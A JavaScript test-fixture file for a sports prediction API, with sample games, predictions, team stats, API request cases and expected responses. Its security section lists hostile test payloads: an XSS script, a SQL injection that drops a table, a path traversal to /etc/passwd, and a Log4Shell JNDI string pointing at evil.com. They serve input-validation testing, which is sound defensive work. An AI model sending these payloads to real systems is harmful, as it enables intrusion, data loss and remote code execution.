// fixtures/test-data.js
/**
 * Test data fixtures for Sports Prediction System
 */

const testGames = {
  nfl: {
    scheduled: {
      id: "nfl_2024_week1_chiefs_bills",
      home_team: "Kansas City Chiefs",
      away_team: "Buffalo Bills", 
      sport: "NFL",
      game_date: "2024-09-15T18:00:00Z",
      status: "scheduled",
      home_score: 0,
      away_score: 0,
      season: "2024",
      week: 1
    },
    completed: {
      id: "nfl_2024_week1_patriots_dolphins",
      home_team: "New England Patriots",
      away_team: "Miami Dolphins",
      sport: "NFL", 
      game_date: "2024-09-08T20:30:00Z",
      status: "completed",
      home_score: 17,
      away_score: 24,
      season: "2024",
      week: 1
    }
  },
  nba: {
    scheduled: {
      id: "nba_2024_lakers_warriors",
      home_team: "Los Angeles Lakers",
      away_team: "Golden State Warriors",
      sport: "NBA",
      game_date: "2024-03-15T22:00:00Z", 
      status: "scheduled",
      home_score: 0,
      away_score: 0,
      season: "2023-24"
    },
    completed: {
      id: "nba_2024_celtics_heat",
      home_team: "Boston Celtics",
      away_team: "Miami Heat",
      sport: "NBA",
      game_date: "2024-03-10T19:30:00Z",
      status: "completed", 
      home_score: 108,
      away_score: 95,
      season: "2023-24"
    }
  }
};

const testPredictions = {
  highConfidence: {
    id: "pred_high_conf_123",
    game_id: "nfl_2024_week1_chiefs_bills",
    predicted_outcome: "home_win",
    confidence_score: 87,
    reasoning: "Home team has 75% win rate in last 8 meetings and strong home field advantage",
    ml_features: {
      home_win_percentage: 0.75,
      away_win_percentage: 0.68,
      head_to_head_home_wins: 6,
      head_to_head_away_wins: 2,
      home_avg_score: 28.5,
      away_avg_score: 24.2
    },
    created_at: "2024-09-14T12:00:00Z"
  },
  lowConfidence: {
    id: "pred_low_conf_456", 
    game_id: "nba_2024_lakers_warriors",
    predicted_outcome: "away_win",
    confidence_score: 52,
    reasoning: "Teams are evenly matched with similar recent performance",
    ml_features: {
      home_win_percentage: 0.62,
      away_win_percentage: 0.64,
      head_to_head_home_wins: 3,
      head_to_head_away_wins: 4,
      home_avg_score: 112.8,
      away_avg_score: 115.1
    },
    created_at: "2024-03-14T15:30:00Z"
  }
};

const testTeamStats = {
  chiefs: {
    team_name: "Kansas City Chiefs",
    sport: "NFL",
    season: "2024",
    games_played: 8,
    wins: 6,
    losses: 2,
    win_percentage: 0.75,
    points_for: 228,
    points_against: 164,
    avg_points_for: 28.5,
    avg_points_against: 20.5,
    home_record: "4-0",
    away_record: "2-2",
    recent_form: ["W", "W", "L", "W", "W"],
    last_updated: "2024-11-01T12:00:00Z"
  },
  lakers: {
    team_name: "Los Angeles Lakers",
    sport: "NBA", 
    season: "2023-24",
    games_played: 45,
    wins: 28,
    losses: 17,
    win_percentage: 0.62,
    points_for: 5076,
    points_against: 4950,
    avg_points_for: 112.8,
    avg_points_against: 110.0,
    home_record: "16-6",
    away_record: "12-11", 
    recent_form: ["W", "L", "W", "W", "L"],
    last_updated: "2024-03-14T18:00:00Z"
  }
};

const testAPIRequests = {
  sportsDataIngestion: {
    valid: {
      method: 'POST',
      endpoint: '/api/sports-data',
      body: {
        sport: 'NFL',
        date: '2024-09-15',
        force_refresh: false
      }
    },
    invalidSport: {
      method: 'POST', 
      endpoint: '/api/sports-data',
      body: {
        sport: 'INVALID_SPORT',
        date: '2024-09-15'
      }
    },
    invalidDate: {
      method: 'POST',
      endpoint: '/api/sports-data', 
      body: {
        sport: 'NFL',
        date: 'invalid-date'
      }
    }
  },
  gamePrediction: {
    valid: {
      method: 'POST',
      endpoint: '/api/game-predictor',
      body: testGames.nfl.scheduled
    },
    missingRequiredFields: {
      method: 'POST',
      endpoint: '/api/game-predictor',
      body: {
        home_team: "Team A"
        // Missing required fields
      }
    }
  },
  getPredictions: {
    valid: {
      method: 'GET',
      endpoint: '/api/predictions',
      params: {
        sport: 'NFL',
        limit: 10
      }
    },
    withFilters: {
      method: 'GET', 
      endpoint: '/api/predictions',
      params: {
        sport: 'NFL',
        confidence_min: 70,
        team: 'Kansas City Chiefs',
        limit: 5
      }
    },
    invalidParams: {
      method: 'GET',
      endpoint: '/api/predictions', 
      params: {
        confidence_min: 150, // Invalid confidence range
        limit: -5 // Invalid limit
      }
    }
  },
  teamStats: {
    valid: {
      method: 'GET',
      endpoint: '/api/team-stats/Kansas%20City%20Chiefs'
    },
    nonExistentTeam: {
      method: 'GET',
      endpoint: '/api/team-stats/Non%20Existent%20Team'
    }
  }
};

const testScenarios = {
  performance: {
    concurrentRequests: 10,
    requestInterval: 100, // ms
    timeouts: {
      fast: 1000,    // 1 second
      normal: 5000,  // 5 seconds  
      slow: 15000    // 15 seconds
    }
  },
  security: {
    maliciousPayloads: [
      '<script>alert("xss")</script>',
      'SELECT * FROM users WHERE id = 1; DROP TABLE users;--',
      '../../../../etc/passwd',
      '${jndi:ldap://evil.com/a}'
    ],
    oversizedPayloads: {
      largeString: 'A'.repeat(1000000), // 1MB string
      deepNesting: generateDeepObject(100)
    }
  },
  loadTesting: {
    virtualUsers: [1, 5, 10, 25, 50],
    duration: 60000, // 1 minute
    rampUp: 10000    // 10 seconds
  }
};

function generateDeepObject(depth) {
  let obj = { value: 'test' };
  for (let i = 0; i < depth; i++) {
    obj = { nested: obj };
  }
  return obj;
}

const expectedResponses = {
  success: {
    statusCode: 200,
    contentType: 'application/json',
    requiredFields: ['status', 'data']
  },
  created: {
    statusCode: 201,
    contentType: 'application/json',
    requiredFields: ['status', 'data', 'id']
  },
  badRequest: {
    statusCode: 400,
    contentType: 'application/json',
    requiredFields: ['status', 'error', 'message']
  },
  notFound: {
    statusCode: 404,
    contentType: 'application/json', 
    requiredFields: ['status', 'error', 'message']
  },
  serverError: {
    statusCode: 500,
    contentType: 'application/json',
    requiredFields: ['status', 'error']
  }
};

module.exports = {
  testGames,
  testPredictions,
  testTeamStats,
  testAPIRequests,
  testScenarios,
  expectedResponses
};
